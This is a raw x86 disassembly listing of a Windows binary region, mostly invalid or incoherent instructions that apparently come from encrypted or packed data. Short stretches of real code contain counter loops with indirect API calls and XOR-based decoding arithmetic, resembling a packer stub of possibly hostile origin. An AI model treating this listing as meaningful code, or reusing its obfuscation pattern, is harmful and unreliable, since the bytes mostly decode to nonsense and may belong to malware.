  407148:	lock loop 0x407180
  40714b:	(bad)  [edx-0x6188deeb]
  407151:	adc    esi,esp
  407153:	sub    DWORD PTR [ecx+eax*4+0x63fcc5cc],ebx
  40715a:	or     BYTE PTR ds:0x97cd223a,bl
  407160:	addr16 pusha 
  407162:	leave  
  407163:	and    DWORD PTR [eax-0x69],eax
  407166:	std    
  407167:	leave  
  407168:	sbb    BYTE PTR [edx*1+0x36bbd0c1],dh
  40716f:	sbb    DWORD PTR [edx-0x28],0x7784960f
  407176:	fsubrp st(0),st
  407178:	(bad)  
  407179:	inc    ebp
  40717a:	test   BYTE PTR ss:[ecx-0x2d],al
  40717e:	inc    eax
  40717f:	(bad)  [edx+0x50]
  407182:	into   
  407183:	add    BYTE PTR [ecx],cl
  407185:	cmp    DWORD PTR [ebx],eax
  407187:	sub    al,BYTE PTR [edi-0x56]
  40718a:	pop    edi
  40718b:	mov    edx,0x56d3b852
  407190:	cli    
  407191:	icebp  
  407192:	pop    ecx
  407193:	loop   0x4071b2
  407195:	aam    0x47
  407197:	cmp    BYTE PTR [edx-0x12],al
  40719a:	ret    
  40719b:	xor    DWORD PTR [esp+edi*8+0x59],edx
  40719f:	push   cs
  4071a0:	or     al,0x5a
  4071a2:	jno    0x407156
  4071a4:	cs push cs
  4071a6:	call   0xc7cbc0ac
  4071ab:	cld    
  4071ac:	pop    esp
  4071ad:	or     al,0xfa
  4071af:	in     eax,dx
  4071b0:	stos   BYTE PTR es:[edi],al
  4071b1:	sub    ebp,DWORD PTR [esi+0x1e1bad85]
  4071b7:	adc    al,0x83
  4071b9:	call   FWORD PTR [ebx-0x6f]
  4071bc:	xor    ebx,ebx
  4071be:	mov    ah,0xe1
  4071c0:	sub    eax,0x9ec5842a
  4071c5:	sti    
  4071c6:	sti    
  4071c7:	xor    BYTE PTR [ecx-0x53],0x81
  4071cb:	sub    BYTE PTR [ebp+0x38d74e74],ah
  4071d1:	add    bl,BYTE PTR [eax+0x7e]
  4071d4:	cwde   
  4071d5:	js     0x407168
  4071d7:	xlat   BYTE PTR ds:[ebx]
  4071d8:	push   esp
  4071d9:	repz sbb eax,0xf3cb742e
  4071df:	jb     0x4071cd
  4071e1:	sbb    DWORD PTR [esi-0x7d],ebx
  4071e4:	push   ds
  4071e5:	adc    al,bh
  4071e7:	imul   edi,DWORD PTR [edi],0xffffffc0
  4071ea:	imul   edi,DWORD PTR [edi-0x47],0xfffffff6
  4071ee:	retf   
  4071ef:	dec    edi
  4071f0:	add    ebx,ebx
  4071f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f3:	imul   BYTE PTR [edi+edx*8-0x73]
  4071f7:	cmp    bh,BYTE PTR [edi-0x4ea87624]
  4071fd:	sahf   
  4071fe:	ret    0xc9ee
  407201:	mov    eax,0x3cad2539
  407206:	pop    ss
  407207:	call   FWORD PTR [ebx+0x7637acf1]
  40720d:	aad    0x60
  40720f:	mov    esi,0x300e5239
  407214:	dec    ebp
  407215:	fcmovnb st,st(7)
  407217:	dec    esp
  407218:	and    esi,DWORD PTR [ebp+0x54]
  40721b:	xor    eax,0xfc06f3d7
  407220:	lods   al,BYTE PTR ds:[esi]
  407221:	lea    ebx,[ebx-0x77]
  407224:	mov    cs,WORD PTR [eax]
  407226:	jmp    0x2e40:0x1cf48baa
  40722d:	pushf  
  40722e:	out    dx,eax
  40722f:	inc    eax
  407230:	sbb    ah,ch
  407232:	pop    es
  407233:	mul    DWORD PTR [edx-0x74]
  407236:	pusha  
  407237:	aas    
  407238:	(bad)  
  407239:	push   cs
  40723a:	ds xchg ebx,eax
  40723c:	or     DWORD PTR [ebx+0x7672c2f1],ebp
  407242:	cmp    ah,BYTE PTR [edx+0x4945d5e]
  407248:	(bad)  
  407249:	call   0x58c75552
  40724e:	es jb  0x40723a
  407251:	sub    eax,0xa20a4c9f
  407256:	mov    ch,0x26
  407258:	push   0xffffff9a
  40725a:	xor    cl,dl
  40725c:	scas   al,BYTE PTR es:[edi]
  40725d:	mov    ebx,DWORD PTR [ebp-0x8b8330a]
  407263:	repnz out dx,al
  407265:	cmovs  ebp,DWORD PTR [edi]
  407268:	ret    0xd993
  40726b:	push   0x89183ea9
  407270:	jg     0x4072d4
  407272:	dec    esp
  407273:	pusha  
  407274:	test   edi,0x704e9aef
  40727a:	xor    eax,0xf8adac1a
  40727f:	jnp    0x40729a
  407281:	out    dx,al
  407282:	dec    ebx
  407283:	dec    edx
  407284:	loop   0x40726b
  407286:	or     ebx,DWORD PTR [edi+0x25]
  407289:	stc    
  40728a:	out    0x6a,eax
  40728c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728d:	mov    dh,0x4a
  40728f:	dec    esi
  407290:	push   ebx
  407291:	mov    ?,WORD PTR [ebp-0x65e41cb6]
  407297:	in     eax,0x89
  407299:	push   0xffffffb2
  40729b:	imul   BYTE PTR [esi]
  40729d:	(bad)  
  40729f:	pusha  
  4072a0:	pop    edi
  4072a1:	sahf   
  4072a2:	pinsrw mm3,WORD PTR [eax],0x8a
  4072a6:	jo     0x407237
  4072a8:	jb     0x40726e
  4072aa:	lea    ecx,[ebp-0x6aedc5ec]
  4072b0:	pop    eax
  4072b1:	cmp    BYTE PTR [ecx+0x6c],ah
  4072b4:	jl     0x407332
  4072b6:	(bad)  
  4072b7:	clc    
  4072b8:	fisttp WORD PTR [edx]
  4072ba:	sbb    al,0x69
  4072bc:	mov    bh,0x2d
  4072be:	xchg   ecx,eax
  4072bf:	push   es
  4072c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072c1:	fmul   DWORD PTR [edx+0x43]
  4072c4:	sbb    bh,bl
  4072c6:	psllq  mm6,mm3
  4072c9:	inc    eax
  4072ca:	cmp    BYTE PTR es:[edx-0x45],dl
  4072ce:	retf   0xbc95
  4072d1:	push   edx
  4072d2:	pop    eax
  4072d3:	sub    al,0xd1
  4072d5:	(bad)  [edi]
  4072d7:	psrlw  mm0,QWORD PTR [ebp+0x70]
  4072db:	xor    cl,ah
  4072dd:	fild   WORD PTR [ebx]
  4072df:	fdivr  DWORD PTR [ebx-0x68b53dd4]
  4072e5:	(bad)  
  4072e7:	adc    ah,BYTE PTR [ecx-0x7c1e99a8]
  4072ed:	fwait
  4072ee:	sub    al,0xb7
  4072f0:	mov    ecx,0xbdfd1d03
  4072f5:	adc    edx,ebp
  4072f7:	(bad)  
  4072f8:	or     al,0x58
  4072fa:	and    esp,DWORD PTR [ebx+0x4af230b6]
  407300:	jbe    0x4072ef
  407302:	icebp  
  407303:	movq   mm7,mm0
  407306:	mov    eax,ds:0x9ae265ed
  40730b:	jmp    0x4072ec
  40730d:	mov    al,0x4f
  40730f:	imul   edi,eax,0x57d68df
  407315:	dec    ebx
  407316:	rcl    DWORD PTR [edx+0xc04c9df],0x65
  40731d:	adc    esp,esp
  40731f:	lds    esp,FWORD PTR [esp+ebx*4]
  407322:	out    dx,eax
  407323:	mov    BYTE PTR [ebp-0x1],0x7f
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a779,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0xaf0ae0cf,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073d5
  4073b7:	mov    esi,0x7d1c319e
  4073bc:	imul   esp,DWORD PTR [bx-0x57],0xffffffa9
  4073c1:	outs   dx,BYTE PTR ds:[esi]
  4073c2:	ret    0x1512
  4073c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073c6:	or     DWORD PTR [ebx+0x5f7a9a85],ebx
  4073cc:	rol    DWORD PTR [edx+edx*1],0x4d
  4073d0:	inc    edi
  4073d1:	data16 jne 0x40744a
  4073d4:	inc    esi
  4073d5:	or     al,0x10
  4073d7:	pushf  
  4073d8:	fs xchg edx,eax
  4073da:	inc    esi
  4073db:	in     al,dx
  4073dc:	mov    DWORD PTR [ecx+0x71],esp
  4073df:	lea    ecx,[edi-0x22]
  4073e2:	test   DWORD PTR [ecx+0x28],ecx
  4073e5:	adc    ch,BYTE PTR [edi]
  4073e7:	fsubr  st,st(6)
  4073e9:	ja     0x4073a0
  4073eb:	jb     0x407400
  4073ed:	mov    bl,bh
  4073ef:	sub    DWORD PTR [eax+0x4b],ecx
  4073f2:	sbb    cl,BYTE PTR [ebp+0x7e]
  4073f5:	int    0x5d
  4073f7:	dec    edx
  4073f8:	dec    eax
  4073f9:	pop    ebx
  4073fa:	xor    ecx,DWORD PTR [esi]
  4073fc:	lods   eax,DWORD PTR ds:[esi]
  4073fd:	das    
  4073fe:	shr    DWORD PTR [ecx],1
  407400:	stos   BYTE PTR es:[edi],al
  407401:	inc    edx
  407402:	adc    eax,DWORD PTR [ebp-0x9]
  407405:	in     eax,dx
  407406:	cmp    al,0xe0
  407408:	sahf   
  407409:	add    esi,DWORD PTR [esi-0x92da232]
  40740f:	ret    0xc3a4
  407412:	bound  ebp,QWORD PTR [edi-0x60]
  407415:	jmp    0x4073f0
  407417:	inc    esi
  407418:	cwde   
  407419:	scas   al,BYTE PTR es:[edi]
  40741a:	das    
  40741b:	sbb    ecx,DWORD PTR [edi]
  40741d:	adc    DWORD PTR es:[ecx+0xd],ecx
  407421:	inc    eax
  407422:	in     al,dx
  407423:	call   0xa6e3eda5
  407428:	ret    0xd37b
  40742b:	ficom  WORD PTR [ebp+0x6e]
  40742e:	inc    esp
  40742f:	stos   DWORD PTR es:[edi],eax
  407430:	adc    al,0xdf
  407432:	fcom   QWORD PTR [eax+0x40]
  407435:	fisubr WORD PTR [ecx+esi*2]
  407438:	inc    eax
  407439:	sbb    al,0x2d
  40743b:	test   DWORD PTR [esi-0x59],ecx
  40743e:	sar    BYTE PTR [edx+ebp*1+0x50],cl
  407442:	pushf  
  407443:	mov    dh,0xd
  407445:	aad    0x47
  407447:	push   ss
  407448:	push   ecx
  407449:	dec    ebp
  40744a:	cmp    al,0x2e
  40744c:	inc    ecx
  40744d:	xor    eax,0xdff2a95f
  407452:	xor    eax,0x7c52cf2f
  407457:	add    DWORD PTR [ecx-0x1d8dcc9f],ecx
  40745d:	call   0x782b96d2
  407462:	inc    ebp
  407463:	mov    WORD PTR [esi-0x51eaf0d3],?
  407469:	mov    esp,0x78051dea
  40746e:	dec    edx
  40746f:	fistp  QWORD PTR [esi-0x264dbd65]
  407475:	invd   
  407477:	add    BYTE PTR [edi+0x68834514],bl
  40747d:	or     DWORD PTR [esi-0x5b],eax
  407480:	int    0xb2
  407482:	les    eax,FWORD PTR [esi]
  407484:	lds    esi,FWORD PTR ds:0xa1a7a7ca
  40748a:	xor    DWORD PTR [eax+0x55],ebp
  40748d:	lds    ecx,FWORD PTR ds:[esi]
  407490:	shl    BYTE PTR [esi],0x73
  407493:	jae    0x40744a
  407495:	loopne 0x407451
  407497:	inc    ecx
  407498:	add    bl,BYTE PTR [ebx-0x18dcc844]
  40749e:	imul   BYTE PTR [ebx]
  4074a0:	sbb    eax,0x49a5e842
  4074a5:	icebp  
  4074a6:	(bad)  
  4074a7:	sub    al,0x61
  4074a9:	cmp    BYTE PTR [eax-0x27],cl
  4074ac:	mov    edx,0x758c4343
  4074b1:	pop    ds
  4074b2:	xchg   esp,eax
  4074b3:	cmp    DWORD PTR [ebp+0x2],ebx
  4074b6:	call   0x555dbfd7
  4074bb:	cli    
  4074bc:	or     eax,0xff37ee99
  4074c1:	jo     0x4074aa
  4074c3:	ss imul esp,esp,0xca9649bc
  4074ca:	cmc    
  4074cb:	pop    ecx
  4074cc:	popa   
  4074cd:	jnp    0x4074d5
  4074cf:	mov    WORD PTR [ebx],es
  4074d1:	ret    0x25c8
  4074d4:	out    0x99,eax
  4074d6:	inc    ebp
  4074d7:	xor    al,0x24
  4074d9:	ins    BYTE PTR es:[edi],dx
  4074da:	mov    ah,ah
  4074dc:	inc    edi
  4074dd:	popa   
  4074de:	mov    ds:0xb89e694a,al
  4074e3:	sbb    al,BYTE PTR [esi]
  4074e5:	jb     0x40748c
  4074e7:	stc    
  4074e8:	loop   0x4074a7
  4074ea:	xor    DWORD PTR [ecx+0x35],eax
  4074ed:	icebp  
  4074ee:	rcr    DWORD PTR [edi],cl
  4074f0:	int    0x6f
  4074f2:	push   es
  4074f3:	sbb    al,0x29
  4074f5:	add    eax,0x47db77f3
  4074fa:	pushf  
  4074fb:	out    0x65,eax
  4074fd:	xchg   ebp,eax
  4074fe:	push   cs
  4074ff:	call   0x7b84:0xdfe0cb63
  407506:	lods   eax,DWORD PTR ds:[esi]
  407507:	push   0xffffffaf
  407509:	add    ah,BYTE PTR [edi]
  40750b:	cli    
  40750c:	add    eax,0xb9c1f0a0
  407511:	cwde   
  407512:	xor    al,0xe3
  407514:	repnz push si
  407517:	retf   0x907d
  40751a:	out    0x66,eax
  40751c:	test   al,0x8
  40751e:	pop    es
  40751f:	mov    edi,0x597ead1a
  407524:	xchg   ebp,eax
  407525:	sbb    DWORD PTR [eax],0xffffffaf
  407528:	xlat   BYTE PTR ds:[ebx]
  407529:	mov    ah,0x13
  40752b:	enter  0xa89c,0xa3
  40752f:	(bad)  
  407530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407531:	scas   al,BYTE PTR es:[edi]
  407532:	sub    dl,BYTE PTR [esi+0x35]
  407535:	dec    ebp
  407536:	fsubr  DWORD PTR [edi+0x2b]
  407539:	scas   al,BYTE PTR es:[edi]
  40753a:	mov    ebp,0x9b2da8ca
  40753f:	not    DWORD PTR [ebx]
  407541:	jg     0x407523
  407543:	std    
  407544:	ficom  WORD PTR ds:0x78c43f6e
  40754a:	push   ss
  40754b:	cmp    bh,bl
  40754d:	xor    al,0x43
  40754f:	fisubr WORD PTR [ebp-0x7b8e2cc9]
  407555:	sbb    DWORD PTR [ebx-0x17],0xfffffffa
  407559:	push   ss
  40755a:	and    cl,BYTE PTR [ecx-0x70]
  40755d:	pop    ebx
  40755e:	stos   BYTE PTR es:[edi],al
  40755f:	and    al,0x28
  407561:	mulps  xmm4,XMMWORD PTR [edi]
  407564:	in     al,dx
  407565:	mov    dh,0xa3
  407567:	bound  edi,QWORD PTR [eax+ebp*4+0x0]
  40756b:	push   0xffffffba
  40756d:	cmp    bh,BYTE PTR [edx+edx*4+0x38506741]
  407574:	push   es
  407575:	sbb    DWORD PTR [edx],edx
  407577:	dec    ch
  407579:	xchg   BYTE PTR [ebx],bh
  40757b:	jle    0x40751b
  40757d:	out    0x92,eax
  40757f:	or     ebx,DWORD PTR [ebp+0x52989fdd]
  407585:	addr16 (bad) 
  407587:	push   edx
  407588:	retf   0xcfa4
  40758b:	jl     0x407511
  40758d:	(bad)  
  40758e:	jb     0x407560
  407590:	fidiv  WORD PTR [ecx-0x3b]
  407593:	jp     0x407580
  407595:	arpl   WORD PTR [edx+0x63],cx
  407598:	mov    DWORD PTR [eax+0x57],esp
  40759b:	xor    dh,bl
  40759d:	add    al,0xf1
  40759f:	xor    BYTE PTR [eax],0xca
  4075a2:	fsin   
  4075a4:	pop    ds
  4075a5:	mov    al,0xa6
  4075a7:	mov    ?,WORD PTR [edx]
  4075a9:	jae    0x40756d
  4075ab:	inc    esi
  4075ac:	aaa    
  4075ad:	push   0xfffffff9
  4075af:	ds push edx
  4075b1:	div    DWORD PTR [ebx+0x2b]
  4075b4:	cs xchg ecx,eax
  4075b6:	jp     0x40754b
  4075b8:	mov    ebx,0x80dd0e81
  4075bd:	scas   al,BYTE PTR es:[edi]
  4075be:	add    eax,0xc4e7d3ae
  4075c3:	lea    eax,[edi]
  4075c5:	mov    DWORD PTR [ebp+0x60],0x7a413579
  4075cc:	cwde   
  4075cd:	loopne 0x4075d0
  4075cf:	mov    ds:0x92cda1dc,eax
  4075d4:	mov    al,0x5d
  4075d6:	mov    edi,esp
  4075d8:	retf   0x75f2
  4075db:	jmp    0xa8f0b238
  4075e0:	mov    dl,BYTE PTR [edx+0x4bce5130]
  4075e6:	cli    
  4075e7:	pop    ecx
  4075e8:	(bad)  
  4075e9:	xlat   BYTE PTR ds:[ebx]
  4075ea:	fbld   TBYTE PTR [ebp+0x47999cf5]
  4075f0:	test   DWORD PTR [edx-0x4e989269],edx
  4075f6:	sbb    DWORD PTR [eax-0x4526fafd],ebx
  4075fc:	dec    ebx
  4075fd:	out    0xdd,al
  4075ff:	std    
  407600:	pop    ecx
  407601:	mov    BYTE PTR [eax+0x1dc29581],dl
  407607:	xor    al,BYTE PTR [edi+eax*8+0x16]
  40760b:	cli    
  40760c:	sbb    ebx,0xffffffa1
  40760f:	mov    edx,0x132c769
  407614:	push   ss
  407615:	cmc    
  407616:	leave  
  407617:	pushw  ss
  407619:	and    DWORD PTR [esi-0x1774fc06],edi
  40761f:	xchg   BYTE PTR [ebx-0xb492f6b],ch
  407625:	(bad)  
  407626:	push   edx
  407627:	jmp    0x538b:0x2385941b
  40762e:	and    esi,DWORD PTR [ebx+ebp*8]
  407631:	js     0x4075c3
  407633:	cdq    
  407634:	lock add DWORD PTR [edi-0x7029f4bf],0xed24f16
  40763f:	ds xchg ecx,eax
  407641:	pusha  
  407642:	or     esi,DWORD PTR [esi-0x60]
  407645:	xchg   ecx,eax
  407646:	push   0x1b9a47ca
  40764b:	sahf   
  40764c:	sahf   
  40764d:	pop    es
  40764e:	les    ebx,FWORD PTR [esp+edi*2-0x66]
  407652:	cli    
  407653:	push   edi
  407654:	call   DWORD PTR [eax]
  407656:	pop    es
  407657:	test   BYTE PTR [ebp+0x65],bh
  40765a:	imul   DWORD PTR [ebp+esi*2-0x13]
  40765e:	push   eax
  40765f:	push   ds
  407660:	ins    DWORD PTR es:[edi],dx
  407661:	pop    edx
  407662:	push   0x5085ba29
  407667:	lds    esp,FWORD PTR [ebx-0x13]
  40766a:	pusha  
  40766b:	or     DWORD PTR [ebx-0xa],esi
  40766e:	xor    al,0x35
  407670:	sbb    al,0xa2
  407672:	sbb    BYTE PTR [edx+0x47],ah
  407675:	inc    ebp
  407676:	mov    cl,0x66
  407678:	push   esp
  407679:	sub    BYTE PTR [edi],bh
  40767b:	adc    edi,0xffffffb2
  40767e:	outs   dx,BYTE PTR ds:[esi]
  40767f:	inc    eax
  407680:	clc    
  407681:	xlat   BYTE PTR ds:[ebx]
  407682:	pop    ebp
  407683:	cmc    
  407684:	jecxz  0x407652
  407686:	cmovno edx,DWORD PTR [esi+esi*2+0x19d67cde]
  40768e:	and    ch,ah
  407690:	push   eax
  407691:	sub    eax,0xc493450d
  407696:	xlat   BYTE PTR ds:[ebx]
  407697:	sahf   
  407698:	mov    ch,0x9d
  40769a:	mov    eax,esp
  40769c:	imul   esp,DWORD PTR [edi+0x59],0x34
  4076a0:	and    DWORD PTR [edi],ebx
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x45ae76e8],1
  407796:	ja     0x407729
  407798:	shl    BYTE PTR [eax+0x647878d6],0x7e
  40779f:	js     0x407819
  4077a1:	loop   0x4077cc
  4077a3:	shr    eax,1
  4077a5:	sbb    al,0xa9
  4077a7:	mov    BYTE PTR [esp+esi*8+0x6bb257cf],cl
  4077ae:	add    edx,DWORD PTR [edx-0x39]
  4077b1:	outs   dx,BYTE PTR ds:[esi]
  4077b2:	scas   eax,DWORD PTR es:[edi]
  4077b3:	adc    ebx,ecx
  4077b5:	cmp    eax,0x3a225cd1
  4077ba:	fdiv   DWORD PTR [ebp-0x37bb0051]
  4077c0:	xchg   BYTE PTR [esi-0x1b496bb],cl
  4077c6:	mov    al,ds:0xe7ce816c
  4077cb:	fbstp  TBYTE PTR [edx+0xba8c110]
  4077d1:	mov    ah,0x7
  4077d3:	cli    
  4077d4:	or     eax,0x879d32ba
  4077d9:	into   
  4077da:	imul   ecx,DWORD PTR [eax-0x4a],0xffffffec
  4077de:	cmp    BYTE PTR [edi],bl
  4077e0:	push   ss
  4077e1:	or     ebp,DWORD PTR [esi+0x54fb7541]
  4077e7:	mov    esp,0x845cdddf
  4077ec:	scas   al,BYTE PTR es:[edi]
  4077ed:	sub    eax,0x87077404
  4077f2:	mov    bl,0xcd
  4077f4:	jmp    0x626:0x9b7e24dd
  4077fb:	xchg   DWORD PTR ds:0x8ca9892f,esp
  407801:	sub    eax,ebp
  407803:	jge    0x40785b
  407805:	leave  
  407806:	mov    eax,ds:0xda7deedf
  40780b:	xchg   edx,eax
  40780c:	push   edx
  40780d:	jl     0x407832
  40780f:	mov    bh,0x4a
  407811:	lea    ebx,gs:[ebx+0x5c]
  407815:	xchg   ebx,eax
  407816:	pop    esp
  407817:	ins    BYTE PTR es:[edi],dx
  407818:	fst    QWORD PTR [ebx-0x6a]
  40781b:	stos   DWORD PTR es:[edi],eax
  40781c:	stos   DWORD PTR es:[edi],eax
  40781d:	out    0x5a,eax
  40781f:	mov    ch,0xd8
  407821:	dec    ebx
  407822:	fiadd  WORD PTR [esi]
  407824:	in     al,dx
  407825:	xlat   BYTE PTR ds:[ebx]
  407826:	mov    eax,ds:0xad1281c7
  40782b:	lods   al,BYTE PTR ds:[esi]
  40782c:	sbb    al,0xc7
  40782e:	xchg   BYTE PTR [edi+0x5d3a7bcc],ch
  407834:	ins    DWORD PTR es:[edi],dx
  407835:	fistp  QWORD PTR [esi]
  407837:	mov    ecx,0xa216bd4d
  40783c:	retf   0x5144
  40783f:	cs mov ebx,0xad55c169
  407845:	cmc    
  407846:	outs   dx,BYTE PTR ds:[esi]
  407847:	add    edi,DWORD PTR [edx+0x2d]
  40784a:	mul    BYTE PTR [esi+0x5e11864b]
  407850:	pop    ss
  407851:	imul   eax,DWORD PTR [ebp-0x12],0x5d
  407855:	fdivrp st(6),st
  407857:	push   esi
  407858:	sbb    eax,0x8055e432
  40785d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40785e:	mov    bl,0x9a
  407860:	enter  0x4978,0x4e
  407864:	sub    bl,BYTE PTR [eax-0x13ac387f]
  40786a:	addr16 inc ebp
  40786c:	jno    0x407878
  40786e:	aas    
  40786f:	cmp    al,0xbd
  407871:	loope  0x407841
  407873:	xchg   ebx,eax
  407874:	imul   edi,edx,0xbcd8fe04
  40787a:	hlt    
  40787b:	addr16 pop edx
  40787d:	fldenv [ebp-0x27]
  407880:	jg     0x407900
  407882:	dec    edi
  407883:	shl    BYTE PTR [edx],1
  407885:	and    eax,0xd32b9cb7
  40788a:	jecxz  0x4078d6
  40788c:	jnp    0x40788a
  40788e:	pop    ebx
  40788f:	test   WORD PTR [ecx+eax*2+0x5d],bp
  407894:	pusha  
  407895:	dec    ebp
  407896:	data16 loope 0x40786d
  407899:	push   ds
  40789a:	test   BYTE PTR [eax-0xcd61c34],dh
  4078a0:	pop    ds
  4078a1:	fistp  QWORD PTR [ebp+edx*4-0x6df0d4fe]
  4078a8:	or     eax,0x850ee33a
  4078ad:	lahf   
  4078ae:	rcr    BYTE PTR [edi],1
  4078b0:	mov    DWORD PTR [edx-0x12113c54],ecx
  4078b6:	xor    eax,0xffe9682d
  4078bb:	inc    eax
  4078bc:	xchg   ebp,eax
  4078bd:	add    BYTE PTR [edi],dl
  4078bf:	(bad)  
  4078c0:	cwde   
  4078c1:	cmp    BYTE PTR [esi+0x39],bl
  4078c4:	fisttp DWORD PTR [esi]
  4078c6:	cmp    al,0xb4
  4078c8:	ret    0x3211
  4078cb:	outs   dx,DWORD PTR ds:[esi]
  4078cc:	sub    DWORD PTR fs:[ecx+0x3b],edx
  4078d0:	gs fwait
  4078d2:	mov    DWORD PTR [edi],ecx
  4078d4:	dec    ecx
  4078d5:	popa   
  4078d6:	in     eax,0x85
  4078d8:	sub    al,0xd5
  4078da:	sti    
  4078db:	adc    edi,DWORD PTR [ebp+0x5e8d3412]
  4078e1:	rol    BYTE PTR [esp+ebx*1+0x428e736d],cl
  4078e8:	sub    ebx,DWORD PTR [edx]
  4078ea:	cmp    dl,bl
  4078ec:	mov    eax,ds:0xe35ddfe
  4078f1:	xor    DWORD PTR [esi],eax
  4078f3:	mov    al,ds:0xd9d6c745
  4078f8:	daa    
  4078f9:	ins    DWORD PTR es:[edi],dx
  4078fa:	sbb    eax,0xc00ee53c
  4078ff:	vpcomb xmm12,xmm5,XMMWORD PTR [ecx+0x79a2be8e],0xb7
  407909:	jo     0x4078e0
  40790b:	ficom  WORD PTR [ecx]
  40790d:	ds call 0x7bd0d806
  407913:	lock pop ss
  407915:	inc    esi
  407916:	jbe    0x407963
  407918:	outs   dx,DWORD PTR ds:[esi]
  407919:	imul   edi,DWORD PTR [ecx],0x90f3efb9
  40791f:	mov    ah,0x3a
  407921:	cmp    ebx,edi
  407923:	setg   BYTE PTR [esi-0x79]
  407927:	mov    BYTE PTR [edx],cl
  407929:	push   es
  40792a:	lods   eax,DWORD PTR ds:[esi]
  40792b:	push   ebx
  40792c:	cli    
  40792d:	jmp    0xee8a968d
  407932:	fsubr  st,st(3)
  407934:	pmaxsw mm0,QWORD PTR [ebp-0x1d]
  407938:	mov    eax,0xe6bbbda
  40793d:	lods   eax,DWORD PTR ds:[esi]
  40793e:	jge    0x40796e
  407940:	inc    ebx
  407941:	aad    0xf3
  407943:	xchg   ch,al
  407945:	arpl   cx,si
  407947:	xchg   ecx,eax
  407948:	adc    ebp,esp
  40794a:	test   BYTE PTR [ebx-0x7a43fec9],0x96
  407951:	lock popa 
  407953:	movlps xmm0,QWORD PTR [eax+0xc]
  407957:	dec    ecx
  407958:	out    dx,al
  407959:	bound  edx,QWORD PTR [ebx]
  40795b:	add    DWORD PTR [ecx-0x6b193332],eax
  407961:	xchg   ebx,eax
  407962:	js     0x4079e2
  407964:	inc    edi
  407965:	or     DWORD PTR [ecx+0xb],eax
  407968:	xchg   ebx,edx
  40796a:	or     BYTE PTR [edx+0x56767615],0x9b
  407971:	inc    ebp
  407972:	mov    ch,0x14
  407974:	loope  0x40797f
  407976:	(bad)  
  407977:	push   ss
  407978:	mov    ecx,0x947bcbd2
  40797d:	and    al,0xd1
  40797f:	sti    
  407980:	mov    cl,0xe
  407982:	clc    
  407983:	sub    al,0x9
  407985:	mov    dl,0x51
  407987:	sub    ah,0xcd
  40798a:	je     0x407938
  40798c:	xor    ah,BYTE PTR [eax]
  40798e:	mov    edx,0x9ff478dd
  407993:	into   
  407994:	push   eax
  407995:	sbb    DWORD PTR [eax+0x4a130232],edx
  40799b:	sbb    eax,0xac477a56
  4079a0:	jae    0xaeed1054
